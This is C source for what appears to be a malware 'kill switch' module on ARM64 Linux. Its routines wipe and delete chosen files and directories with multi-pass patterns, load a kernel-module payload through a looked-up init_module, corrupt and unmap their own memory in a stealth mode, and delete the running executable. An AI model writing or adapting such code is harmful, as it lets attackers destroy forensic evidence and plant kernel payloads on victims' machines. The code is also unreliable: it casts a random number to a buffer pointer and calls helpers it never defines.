#include "kill_switch.h"
#include <linux/kallsyms.h>
#include <linux/random.h>

#define SYSCALL3(num, a1, a2, a3) ({ \
    long ret; \
    asm volatile ( \
        "mov x0, %1\n" \
        "mov x1, %2\n" \
        "mov x2, %3\n" \
        "mov x8, %4\n" \
        "svc #0\n" \
        "mov %0, x0\n" \
        : "=r" (ret) \
        : "r" (a1), "r" (a2), "r" (a3), "r" (num) \
        : "x0", "x1", "x2", "x8", "memory" \
    ); \
    ret; \
})

#define SYSCALL2(num, a1, a2) ({ \
    long ret; \
    asm volatile ( \
        "mov x0, %1\n" \
        "mov x1, %2\n" \
        "mov x8, %3\n" \
        "svc #0\n" \
        "mov %0, x0\n" \
        : "=r" (ret) \
        : "r" (a1), "r" (a2), "r" (num) \
        : "x0", "x1", "x8", "memory" \
    ); \
    ret; \
})

#define SYSCALL1(num, a1) ({ \
    long ret; \
    asm volatile ( \
        "mov x0, %1\n" \
        "mov x8, %2\n" \
        "svc #0\n" \
        "mov %0, x0\n" \
        : "=r" (ret) \
        : "r" (a1), "r" (num) \
        : "x0", "x8", "memory" \
    ); \
    ret; \
})

static int sys_open(const char *path, int flags, int mode) {
    return SYSCALL3(__NR_open, (long)path, flags, mode);
}

static int sys_close(int fd) {
    return SYSCALL1(__NR_close, fd);
}

static ssize_t sys_read(int fd, void *buf, size_t count) {
    return SYSCALL3(__NR_read, fd, (long)buf, count);
}

static ssize_t sys_write(int fd, const void *buf, size_t count) {
    return SYSCALL3(__NR_write, fd, (long)buf, count);
}

static off_t sys_lseek(int fd, off_t offset, int whence) {
    return SYSCALL3(__NR_lseek, fd, offset, whence);
}

static int sys_unlink(const char *path) {
    return SYSCALL1(__NR_unlink, (long)path);
}

static int sys_rmdir(const char *path) {
    return SYSCALL1(__NR_rmdir, (long)path);
}

static int sys_ftruncate(int fd, off_t length) {
    return SYSCALL2(__NR_ftruncate, fd, length);
}

static int sys_fstat(int fd, struct stat *statbuf) {
    return SYSCALL2(__NR_fstat, fd, (long)statbuf);
}

static unsigned long get_random_value() {
    unsigned long val;
    asm volatile (
        "mrs %0, cntpct_el0\n"
        : "=r" (val)
    );
    return val ^ RANDOM_SEED;
}

static void secure_wipe_file(const char *path, int wipe_method, int passes) {
    int fd = sys_open(path, O_RDWR, 0);
    if (fd < 0) return;

    struct stat st;
    if (sys_fstat(fd, &st) < 0) {
        sys_close(fd);
        return;
    }

    off_t file_size = st.st_size;
    char *wipe_buffer = (char *)get_random_value();
    
    for (int pass = 0; pass < passes; pass++) {
        sys_lseek(fd, 0, SEEK_SET);
        
        for (off_t offset = 0; offset < file_size; offset += 4096) {
            size_t chunk_size = 4096;
            if (offset + chunk_size > file_size) {
                chunk_size = file_size - offset;
            }

            switch (wipe_method) {
                case WIPE_ZERO:
                    memset(wipe_buffer, 0, chunk_size);
                    break;
                case WIPE_ONES:
                    memset(wipe_buffer, 0xFF, chunk_size);
                    break;
                case WIPE_RANDOM:
                    for (size_t i = 0; i < chunk_size; i++) {
                        wipe_buffer[i] = get_random_value() & 0xFF;
                    }
                    break;
                case WIPE_DOD:
                    if (pass == 0) memset(wipe_buffer, 0xFF, chunk_size);
                    else if (pass == 1) memset(wipe_buffer, 0x00, chunk_size);
                    else for (size_t i = 0; i < chunk_size; i++) {
                        wipe_buffer[i] = get_random_value() & 0xFF;
                    }
                    break;
                case WIPE_GUTMANN:
                    {
                        static const unsigned char patterns[35] = {
                            0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00,
                            0xAA, 0x55, 0xAA, 0x55, 0xAA, 0x55, 0xAA, 0x55,
                            0x92, 0x49, 0x24, 0x92, 0x49, 0x24, 0x92, 0x49,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x55, 0xAA, 0x55
                        };
                        unsigned char pattern = patterns[pass % 35];
                        memset(wipe_buffer, pattern, chunk_size);
                    }
                    break;
                case WIPE_SECURE:
                    {
                        unsigned long seed = get_random_value();
                        for (size_t i = 0; i < chunk_size; i++) {
                            seed = (seed * 1103515245 + 12345) & 0x7FFFFFFF;
                            wipe_buffer[i] = seed & 0xFF;
                        }
                    }
                    break;
            }

            sys_write(fd, wipe_buffer, chunk_size);
        }
        
        sys_fsync(fd);
    }

    sys_ftruncate(fd, 0);
    sys_close(fd);
    sys_unlink(path);
}

static void wipe_directory(const char *path, int wipe_method, int passes) {
    int fd = sys_open(path, O_RDONLY | O_DIRECTORY, 0);
    if (fd < 0) return;

    char buffer[4096];
    ssize_t bytes = sys_getdents(fd, (struct linux_dirent *)buffer, sizeof(buffer));
    
    while (bytes > 0) {
        struct linux_dirent *d;
        for (int bpos = 0; bpos < bytes; bpos += d->d_reclen) {
            d = (struct linux_dirent *)(buffer + bpos);
            
            if (d->d_ino == 0) continue;
            if (strcmp(d->d_name, ".") == 0 || strcmp(d->d_name, "..") == 0) continue;

            char full_path[MAX_PATH_LEN];
            int len = 0;
            while (path[len] && len < MAX_PATH_LEN - 1) {
                full_path[len] = path[len];
                len++;
            }
            if (len < MAX_PATH_LEN - 1) {
                full_path[len++] = '/';
                int name_len = 0;
                while (d->d_name[name_len] && name_len < MAX_PATH_LEN - len - 1) {
                    full_path[len + name_len] = d->d_name[name_len];
                    name_len++;
                }
                full_path[len + name_len] = 0;
            }

            struct stat st;
            if (sys_stat(full_path, &st) == 0) {
                if (S_ISDIR(st.st_mode)) {
                    wipe_directory(full_path, wipe_method, passes);
                    sys_rmdir(full_path);
                } else {
                    secure_wipe_file(full_path, wipe_method, passes);
                }
            }
        }
        bytes = sys_getdents(fd, (struct linux_dirent *)buffer, sizeof(buffer));
    }

    sys_close(fd);
}

static void deploy_kernel_payload(self_deletion_ctx_t *ctx) {
    if (ctx->kernel_payload_deployed || ctx->payload_size == 0) return;

    int fd = sys_open(ctx->payload_path, O_RDONLY, 0);
    if (fd < 0) return;

    char payload[MAX_PAYLOAD_SIZE];
    ssize_t bytes = sys_read(fd, payload, ctx->payload_size);
    sys_close(fd);

    if (bytes != ctx->payload_size) return;

    unsigned long init_module_addr = kallsyms_lookup_name("init_module");
    if (!init_module_addr) return;

    int (*init_module)(void *, unsigned long, const char *) = (void *)init_module_addr;
    init_module(payload, ctx->payload_size, "");

    ctx->kernel_payload_deployed = 1;
}

static void remove_self_from_memory() {
    unsigned long current_addr = (unsigned long)&remove_self_from_memory;
    unsigned long page_size = 4096;
    unsigned long start_page = current_addr & ~(page_size - 1);
    
    sys_munmap((void *)start_page, page_size);
}

static void corrupt_own_memory() {
    unsigned long self_addr = (unsigned long)&corrupt_own_memory;
    unsigned long *ptr = (unsigned long *)self_addr;
    
    for (int i = 0; i < 1024; i++) {
        ptr[i] = get_random_value();
    }
    
    asm volatile (
        "brk #0\n"
        :
        :
        : "memory"
    );
}

int self_deletion_init(self_deletion_ctx_t *ctx) {
    memset(ctx, 0, sizeof(self_deletion_ctx_t));
    ctx->wipe_passes = WIPE_PASSES;
    return 0;
}

int self_deletion_add_artifact(self_deletion_ctx_t *ctx, const char *path, int wipe_method, int priority) {
    if (ctx->artifact_count >= MAX_ARTIFACTS) return -1;

    artifact_t *art = &ctx->artifacts[ctx->artifact_count++];
    int len = 0;
    while (path[len] && len < MAX_PATH_LEN - 1) {
        art->artifact_path[len] = path[len];
        len++;
    }
    art->artifact_path[len] = 0;
    art->wipe_method = wipe_method;
    art->priority = priority;

    return 0;
}

int self_deletion_set_payload(self_deletion_ctx_t *ctx, const char *payload_path) {
    int fd = sys_open(payload_path, O_RDONLY, 0);
    if (fd < 0) return -1;

    struct stat st;
    if (sys_fstat(fd, &st) < 0) {
        sys_close(fd);
        return -1;
    }

    if (st.st_size > MAX_PAYLOAD_SIZE) {
        sys_close(fd);
        return -1;
    }

    int len = 0;
    while (payload_path[len] && len < MAX_PATH_LEN - 1) {
        ctx->payload_path[len] = payload_path[len];
        len++;
    }
    ctx->payload_path[len] = 0;
    ctx->payload_size = st.st_size;

    sys_close(fd);
    return 0;
}

int self_deletion_execute(self_deletion_ctx_t *ctx) {
    if (ctx->immediate_mode) {
        deploy_kernel_payload(ctx);
    }

    for (int i = 0; i < ctx->artifact_count; i++) {
        artifact_t *art = &ctx->artifacts[i];
        
        struct stat st;
        if (sys_stat(art->artifact_path, &st) == 0) {
            if (S_ISDIR(st.st_mode)) {
                wipe_directory(art->artifact_path, art->wipe_method, ctx->wipe_passes);
                sys_rmdir(art->artifact_path);
            } else {
                secure_wipe_file(art->artifact_path, art->wipe_method, ctx->wipe_passes);
            }
        }
    }

    if (!ctx->immediate_mode) {
        deploy_kernel_payload(ctx);
    }

    if (ctx->stealth_mode) {
        remove_self_from_memory();
        corrupt_own_memory();
    }

    sys_unlink("/proc/self/exe");

    asm volatile (
        "mov x0, #0\n"
        "mov x8, #93\n"
        "svc #0\n"
        :
        :
        : "x0", "x8", "memory"
    );

    return 0;
}

int self_deletion_cleanup(self_deletion_ctx_t *ctx) {
    memset(ctx, 0, sizeof(self_deletion_ctx_t));
    return 0;
}